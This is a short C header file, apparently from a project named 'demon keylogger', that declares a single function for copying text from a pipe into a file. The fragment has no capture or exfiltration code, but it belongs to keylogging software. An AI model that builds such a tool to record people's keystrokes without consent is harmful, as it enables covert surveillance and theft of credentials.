#ifndef DEMON_KEYLOGGER_FILE_WRITER_H
#define DEMON_KEYLOGGER_FILE_WRITER_H

#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <syslog.h>

/**
 * Writes text received from a pipe into the specified file.
 *
 * @param read_pipe the read end of a pipe
 * @param file_desc the file to write into
 */
void file_writer(int read_pipe, int file_desc);

#endif //DEMON_KEYLOGGER_FILE_WRITER_H
